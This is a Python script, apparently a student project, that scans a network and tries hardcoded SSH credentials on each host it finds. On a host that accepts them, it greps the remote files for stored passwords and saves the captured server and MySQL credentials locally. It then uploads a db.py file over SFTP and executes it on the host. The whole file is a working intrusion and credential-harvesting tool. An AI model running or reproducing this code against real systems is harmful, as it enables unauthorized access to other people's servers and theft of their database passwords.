import paramiko
import re
import json
import yaml
import pickle
import scaner as scan

class SSH(object):
    def __init__(self, username = 'pythonista', password = 'letmein', login = 'root'):
        self.server = ''
        self.ssh_port = ''
        self.username = username
        self.password = password
        self.mysql_login = login
        self.mysql_password = ''

        self.ssh = None

    def get_server_info(self):
        info = {
            'server_ip':self.server,
            'ssh_port':self.ssh_port,
            'username':self.username,
            'password':self.password
        }
        return info
    def get_mysql_info(self):
        info = {
            'mysql_login':self.mysql_login,
            'mysql_password':self.mysql_password
        }
        return info

    def get_all_info(self):
        server_info = self.get_server_info()
        mysql_imfo = self.get_mysql_info()
        server_info.update(mysql_imfo)
        return server_info

    def try_ssh_con(self, host, port, user, passw):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, int(port), username=user, password=passw)
            #ssh.close()
        except:
            ssh.close()
            print('ssh: can not connect')
            return None
        else:
            self.ssh = ssh
            return ssh

    # find server and port and ssh_connection in struct net
    def find_server(self, **struct_net):
        ssh = None
        for host, ports in struct_net.items():
            for port in ports:
                ssh = self.try_ssh_con(host, port, self.username, self.password)
                self.ssh = ssh
                self.server = host
                self.ssh_port = port
                if ssh:
                    return host, port, ssh
        return None, None, None

    def find_password(self, ssh_conn):
        stdin, stdout, stderr = ssh_conn.exec_command('grep -R password= *')
        data = stdout.read()
        pattern = re.compile('password=([a-zA-Z0-9]+)')
        passwords = pattern.findall(data)
        if not len(passwords) == 0:
            self.mysql_password = passwords[0]
        return self.mysql_password

    def save_server_info_json(self, **server_info):
        json.dump(server_info, open('alesya_server.json', 'w'))

    def save_mysql_info_yaml(self, **mysql_info):
        yaml.dump(mysql_info, open('alesya_sql.yaml', 'w'))

    def save_backup(self, **info):
        pickle.dump(info, open('alesya_bin_backup.txt', 'w'))

    def copy_db_file(self):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.server, port=int(self.ssh_port), username=self.username, password=self.password)
            sftp = ssh.open_sftp()
            path = '/home/{}/db.py'.format(self.username)
            sftp.put('db.py', path)
            sftp.close()
            #ssh.close()
            return True
        except:
            print('Err: ssh copy file')
            ssh.close()
            return False

    def check_db(self):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.server, port=int(self.ssh_port), username=self.username, password=self.password)
            command = 'python db.py root exam'.format(self.username)
            stdin, stdout, stderr = ssh.exec_command(command)
        except:
            print('Error: ssh check db')
        finally:
            ssh.close()

if __name__ == "__main__" :
    struct_net = scan.ScanNet().get_struct_net()
    print(struct_net)
    json.dump(struct_net, open('struct_net', 'w'))

    ssh = SSH()

    password_mysql = ''
    server, ssh_port, ssh_con = ssh.find_server(**struct_net)
    print( server, ssh_port, ssh_con)

    if server and ssh_port and ssh_con:
        ssh.save_server_info_json(**ssh.get_server_info())
        passwords = ssh.find_password(ssh_con)
        ssh.save_mysql_info_yaml(**ssh.get_mysql_info())
        ssh.save_backup(**ssh.get_all_info())

    ssh.check_db()



